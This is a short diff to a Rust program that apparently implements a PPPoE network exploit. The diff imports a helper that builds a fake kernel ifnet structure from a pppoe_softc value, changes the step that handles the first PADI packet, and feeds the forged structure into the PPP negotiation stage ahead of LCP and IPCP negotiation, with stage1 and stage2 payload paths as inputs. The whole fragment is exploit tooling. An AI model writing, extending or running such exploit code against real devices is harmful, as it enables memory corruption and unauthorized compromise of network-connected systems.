@@ -2,6 +2,7 @@ mod constants;
 mod exploit;
 mod parser;
 
+use exploit::build_fake_ifnet;
 use exploit::Exploit;
 use parser::{get_args, Args};
 use pnet::datalink::{self};
@@ -44,8 +45,8 @@ fn run_exploit(interface_name: String, stage1_path: String, stage2_path: String)
 
     // Stages of the exploit
     println!("[+] Starting Negotiations ...");
-    expl.ignore_first_padi(&interface);
-    expl.ppp_negotiation(&interface, Some(expl.get_fake_ifnet()));
+    expl.capture_first_padi(&interface);
+    expl.ppp_negotiation(&interface, Some(build_fake_ifnet(expl.pppoe_softc)));
     expl.lcp_negotiation(&interface);
     expl.ipcp_negotiation(&interface);
     println!("[+] Initial Negotiations Done...");
